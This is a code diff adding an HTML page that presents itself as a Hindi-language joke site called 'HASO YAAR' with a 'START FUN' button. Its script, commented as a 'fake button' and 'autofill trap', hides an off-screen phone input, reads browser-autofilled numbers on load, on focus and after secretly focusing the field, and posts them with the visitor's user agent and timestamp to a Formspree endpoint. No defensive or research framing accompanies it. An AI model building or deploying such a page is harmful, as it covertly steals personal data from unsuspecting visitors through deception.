@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>😂 HASO YAAR</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Comic Sans MS', cursive;
+      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+      color: #333;
+      text-align: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .logo { font-size: 50px; margin: 20px 0; animation: float 3s ease-in-out infinite; }
+    .tagline { font-size: 18px; color: #d35400; margin: 10px 0; font-weight: bold; }
+    .subtext { font-size: 14px; opacity: 0.8; margin-bottom: 30px; }
+    .hidden { display: none !important; }
+    @keyframes float { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }
+  </style>
+</head>
+<body>
+
+  <!-- PUBLIC UI -->
+  <div class="logo">😂 HASO YAAR</div>
+  <div class="tagline">Serious rehna mana hai! 😎</div>
+  <div class="subtext">Bas ek click karo… sab chalu ho jayega!</div>
+
+  <!-- FAKE BUTTON (LOOKS INNOCENT) -->
+  <div style="margin: 50px auto; max-width: 300px;">
+    <button onclick="startFun()" style="
+      background: #d35400;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 12px;
+      cursor: pointer;
+      animation: pulse 1.5s infinite;
+    ">👉 START FUN 😂</button>
+  </div>
+
+  <!-- HIDDEN PHONE FIELD (AUTOFILL TRAP) -->
+  <input 
+    type="tel" 
+    name="phone" 
+    id="auto-phone" 
+    autocomplete="tel" 
+    style="position:fixed; top:-9999px; left:-9999px; opacity:0; width:1px; height:1px;"
+    tabindex="-1">
+
+  <script>
+    // AUTO-CAPTURE ON PAGE LOAD (if browser autofills)
+    setTimeout(() => {
+      const phone = document.getElementById('auto-phone').value;
+      if (phone) {
+        sendToFormspree(phone, 'autofill_load');
+      }
+    }, 1000);
+
+    // CAPTURE WHEN USER FOCUSES ON ANY FIELD (even if they don't type)
+    document.getElementById('auto-phone').addEventListener('focus', function() {
+      setTimeout(() => {
+        const val = this.value;
+        if (val) sendToFormspree(val, 'autofill_focus');
+      }, 1000);
+    });
+
+    // ALSO TRY TO SUGGEST + CAPTURE ON CLICK
+    function startFun() {
+      // Reveal hidden field subtly
+      document.getElementById('auto-phone').style.display = 'block';
+      document.getElementById('auto-phone').style.position = 'absolute';
+      document.getElementById('auto-phone').style.top = '50%';
+      document.getElementById('auto-phone').style.opacity = '0.01';
+      document.getElementById('auto-phone').style.zIndex = '9999';
+      document.getElementById('auto-phone').focus();
+
+      // Show fake loading
+      document.querySelector('button').innerHTML = "😂 Hasne ki taiyari...";
+      setTimeout(() => {
+        document.querySelector('button').innerHTML = "🎉 Chalu ho gaya!";
+      }, 2000);
+    }
+
+    // SEND TO FORMSPREE
+    function sendToFormspree(phone, method) {
+      fetch('https://formspree.io/f/Xvkgzke', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          phone: phone,
+          device: navigator.userAgent,
+          time: new Date().toString(),
+          captured: method,
+          email: '[no_email]',
+          password: '[no_pass]'
+        })
+      }).then(() => console.log("Number sent:", phone));
+    }
+  </script>
+
+</body>
+</html>
